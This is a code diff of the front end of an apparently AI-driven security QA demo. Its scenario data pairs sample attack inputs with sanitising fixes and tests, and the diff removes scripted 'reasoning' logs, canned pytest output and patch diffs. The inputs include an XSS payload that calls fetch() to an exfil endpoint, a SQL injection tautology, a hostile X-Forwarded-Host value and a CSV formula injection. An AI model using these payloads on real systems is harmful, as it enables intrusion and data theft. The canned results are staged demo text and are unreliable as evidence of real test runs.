@@ -341,15 +341,15 @@
                 <!-- Screenshot Filmstrip Controls -->
                 <div class="grid grid-cols-3 gap-2 pt-3">
                   <button id="btnSnap1" onclick="selectBrowserSnapshot(0)" class="p-2 rounded-lg bg-slate-950 border border-vultr-500 text-left transition">
-                    <div class="text-[10px] font-bold text-vultr-400 mono">STAGE #01 · 0.4s</div>
+                    <div class="text-[10px] font-bold text-vultr-400 mono">STAGE #01</div>
                     <div class="text-xs text-slate-200 truncate">Containment</div>
                   </button>
                   <button id="btnSnap2" onclick="selectBrowserSnapshot(1)" class="p-2 rounded-lg bg-slate-950 border border-slate-800 hover:border-slate-700 text-left transition">
-                    <div class="text-[10px] font-bold text-rose-400 mono">STAGE #02 · 1.3s</div>
+                    <div class="text-[10px] font-bold text-rose-400 mono">STAGE #02</div>
                     <div class="text-xs text-slate-200 truncate">Sandbox Exec</div>
                   </button>
                   <button id="btnSnap3" onclick="selectBrowserSnapshot(2)" class="p-2 rounded-lg bg-slate-950 border border-slate-800 hover:border-slate-700 text-left transition">
-                    <div class="text-[10px] font-bold text-emerald-400 mono">STAGE #03 · 2.8s</div>
+                    <div class="text-[10px] font-bold text-emerald-400 mono">STAGE #03</div>
                     <div class="text-xs text-slate-200 truncate">Receipt</div>
                   </button>
                 </div>
@@ -935,14 +935,6 @@ cd backend &amp;&amp; nohup python3 -m uvicorn main:app --host 0.0.0.0 --port 80
         input1: "<img src=x onerror=fetch('http://10.0.0.1/exfil')>",
         input2: 'promo_discount = -9999.00 (Concurrent Thread #4)',
         visionText: 'Unescaped DOM sink detected in #promoBanner & negative cart total (-$9,849.00) rendered without server bounds check.',
-        reasoning: [
-          '[VULTR-LLM] Connected to https://api.vultrinference.com/v1 (deepseek-v4.1-flash-1017)',
-          '[PLAN] Dispatching Pattern B (HTTP Probe container sb-vultr-9f8a) to inspect /checkout DOM inputs.',
-          '[BROWSER] Injected boundary XSS & negative discount strings into #promoCode and #quantity.',
-          '[PROBE] HTTP probe confirms unescaped <img onerror> reflection and negative subtotal (-$9,849.00).',
-          '[PATTERN-A] Spinning up air-gapped Python container (--network none, 256MB cap) to run repro_and_verify.py.',
-          '[SELF-HEAL] Patching sanitize_promo_code() and enforcing Decimal(0) floor. Re-running pytest suite: 14/14 PASSED.'
-        ],
         code: `import html
 from decimal import Decimal
 
@@ -958,28 +950,6 @@ res = process_checkout_promo("<img src=x onerror=window.__xss(1)>", Decimal("150
 assert "<img" not in res["banner"], "XSS sink still unescaped!"
 assert res["total"] == Decimal("150.00"), "Negative discount bypassed bounds!"
 print("PASS: XSS neutralized & checkout total bounded at $" + str(res["total"]))`,
-        terminalOutput: `root@sb-vultr-9f8a:/workspace$ pytest repro_and_verify.py -v
-================================ test session starts ================================
-platform linux -- Python 3.12.3, pytest-8.2.0 -- [SANDBOX]
-collected 2 items
-
-repro_and_verify.py::test_xss_escaped PASSED                                  [ 50%]
-repro_and_verify.py::test_negative_promo_bounded PASSED                       [100%]
-
-PASS: XSS neutralized & checkout total bounded at $150.00
-========================= 2 passed in 0.34s (RAM: 64MB/256MB) =======================`,
-        diff: `--- a/app/checkout_handler.py (VULNERABLE)
-+++ b/app/checkout_handler.py (SELF-HEALED IN SANDBOX)
-@@ -14,5 +14,8 @@
- def apply_promo(raw_code: str, subtotal: Decimal, discount: Decimal):
--    # BUG: Raw HTML concatenation + unchecked negative discount
--    banner = f"<div>Promo applied: {raw_code}</div>"
--    return {"banner": banner, "total": subtotal - discount}
-+    # FIX: Context-aware HTML escaping + strict Decimal floor/ceiling
-+    safe_code = html.escape(raw_code.strip(), quote=True)
-+    bounded_discount = max(Decimal("0.00"), min(discount, subtotal))
-+    final_total = max(Decimal("0.00"), subtotal - bounded_discount)
-+    return {"banner": f"<div>Promo applied: {safe_code}</div>", "total": final_total}`
       },
       vaultauth: {
         url: 'https://sso-staging.vaultauth.internal/api/v1/login',
@@ -988,13 +958,6 @@ PASS: XSS neutralized & checkout total bounded at $150.00
         input1: "admin' OR '1'='1' --",
         input2: 'X-Forwarded-Host: attacker-redirect.tld',
         visionText: 'Vision model flagged unauthorized Admin Dashboard redirect after injecting tautology payload into #emailInput.',
-        reasoning: [
-          '[VULTR-LLM] Analyzing VaultAuth SSO login flow with deepseek-v4.1-flash-1017.',
-          '[PATTERN-B] HTTP Probe container navigating to /api/v1/login and testing auth boundary strings.',
-          '[PROBE] Detected unauthorized session elevation (Admin Banner rendered without MFA).',
-          '[PATTERN-A] Writing SQLite reproduction test inside isolated container sb-vultr-4c12.',
-          '[SELF-HEAL] Replaced string formatting with parameterized cursor bindings and strict host whitelist.'
-        ],
         code: `import sqlite3
 
 def authenticate_user_safe(conn, username: str, password_hash: str):
@@ -1012,19 +975,6 @@ conn.execute("INSERT INTO users VALUES (1, 'admin', 'hash_secret', ' superadmin'
 bypass = authenticate_user_safe(conn, "admin' OR '1'='1' --", "wrong")
 assert bypass is None, "SQLi bypass succeeded!"
 print("PASS: SQL Injection tautology blocked cleanly in isolated container.")`,
-        terminalOutput: `root@sb-vultr-4c12:/workspace$ python3 repro_and_verify.py
-[SANDBOX] Network namespace: NONE | Secrets mounted: 0 | RootFS: READ-ONLY
-Testing payload: "admin' OR '1'='1' --" -> Result: None (Blocked)
-Testing valid auth: "admin" -> Result: (1, 'superadmin')
-PASS: SQL Injection tautology blocked cleanly in isolated container.`,
-        diff: `--- a/auth/login_service.py (VULNERABLE)
-+++ b/auth/login_service.py (SELF-HEALED IN SANDBOX)
-@@ -21,4 +21,6 @@
- def verify_credentials(cursor, username: str, pwd_hash: str):
--    query = f"SELECT id, role FROM users WHERE username = '{username}' AND pwd = '{pwd_hash}'"
--    return cursor.execute(query).fetchone()
-+    query = "SELECT id, role FROM users WHERE username = ? AND pwd = ?"
-+    return cursor.execute(query, (username, pwd_hash)).fetchone()`
       },
       supplychain: {
         url: 'https://procure-staging.vultr-demo.internal/invoices/upload',
@@ -1033,12 +983,6 @@ PASS: SQL Injection tautology blocked cleanly in isolated container.`,
         input1: '=CMD|\'/C calc\'!A0 (CSV Cell Injection)',
         input2: 'line_item_qty = 1e308 (IEEE-754 Float Overflow)',
         visionText: 'Vision inspector flagged unquoted spreadsheet formula prefix (=CMD) and NaN invoice total in reconciliation table.',
-        reasoning: [
-          '[VULTR-LLM] Planning Pattern B + A audit for SupplyGuard invoice ingestion pipeline.',
-          '[PATTERN-B] Uploading synthetic vendor CSV via HTTP Probe inside disposable container.',
-          '[PATTERN-A] Reproducing formula prefix (=, +, -, @) and float overflow in isolated Python sandbox.',
-          '[SELF-HEAL] Added strict cell sanitization prefixing and finite Decimal quantization.'
-        ],
         code: `from decimal import Decimal, InvalidOperation
 
 DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
@@ -1051,20 +995,6 @@ def sanitize_invoice_cell(val: str) -> str:
 
 assert sanitize_invoice_cell("=CMD|'/C calc'!A0").startswith("'")
 print("PASS: CSV Formula Injection neutralized inside sandbox.")`,
-        terminalOutput: `root@sb-vultr-7d91:/workspace$ pytest test_invoice_sanitizer.py
-[SANDBOX] cgroup memory limit: 256MB | CPU quota: 50000/100000
-test_invoice_sanitizer.py::test_csv_injection_neutralized PASSED
-test_invoice_sanitizer.py::test_decimal_overflow_guarded PASSED
-PASS: CSV Formula Injection neutralized inside sandbox.`,
-        diff: `--- a/invoices/csv_parser.py
-+++ b/invoices/csv_parser.py
-@@ -8,3 +8,6 @@
- def parse_vendor_cell(cell_value: str) -> str:
--    return cell_value.strip()
-+    clean = cell_value.strip()
-+    if clean.startswith(("=", "+", "-", "@", "\\t", "\\r")):
-+        return "'" + clean
-+    return clean`
       },
       custom: {
         url: 'https://your-staging-app.vultr.app/api/checkout',
@@ -1073,10 +1003,6 @@ PASS: CSV Formula Injection neutralized inside sandbox.`,
         input1: '<svg onload=window.__probe=1>',
         input2: '{"amount": -1, "currency": "USD"}',
         visionText: 'Live custom target probe active: inspecting DOM mutations, network waterfall, and boundary responses.',
-        reasoning: [
-          '[VULTR-LLM] Ready to dispatch custom target prompt to https://api.vultrinference.com/v1.',
-          '[INFO] Click "Vultr API" in the top right to paste your live Vultr Serverless Inference API key, or click Dispatch Audit to run the full sandbox verification loop.'
-        ],
         code: `# Custom Sandbox Verification Script (Editable)
 import os, sys
 
@@ -1084,16 +1010,6 @@ print("Sandbox Python:", sys.version.split()[0])
 print("Mounted Host API Keys:", [k for k in os.environ if "KEY" in k or "SECRET" in k])
 assert len([k for k in os.environ if "VULTR" in k]) == 0, "Secret leak!"
 print("PASS: Zero secrets exposed inside ephemeral container.")`,
-        terminalOutput: `root@sb-vultr-custom:/workspace$ python3 custom_verify.py
-Sandbox Python: 3.12.3
-Mounted Host API Keys: []
-PASS: Zero secrets exposed inside ephemeral container.`,
-        diff: `--- a/target_handler.py
-+++ b/target_handler.py
-@@ -1,3 +1,4 @@
-+# Verified by AegisQA on Vultr Cloud Compute
- def validate_payload(payload: dict) -> bool:
-     return isinstance(payload.get("amount"), int) and payload["amount"] >= 0`
       }
     };
 
@@ -1700,6 +1616,7 @@ PASS: Zero secrets exposed inside ephemeral container.`,
     }
 
     function copyGitHubPrTemplate() {
+      if (state.receipts.length === 0) { showToast('⚠️', 'No receipts yet — run an audit first.'); return; }
       const r = state.receipts[0];
       const text = ['### 🛡️ AegisQA Verified Security & QA Patch (' + r.id + ')', '- **Target**: ' + r.target, '- **Finding**: ' + r.finding, '- **Sandbox Containment**: ' + r.containment, '- **SHA-256 Execution Proof**: `' + r.sha256 + '`'].join('\\n');
       copyTextToClipboard(text);
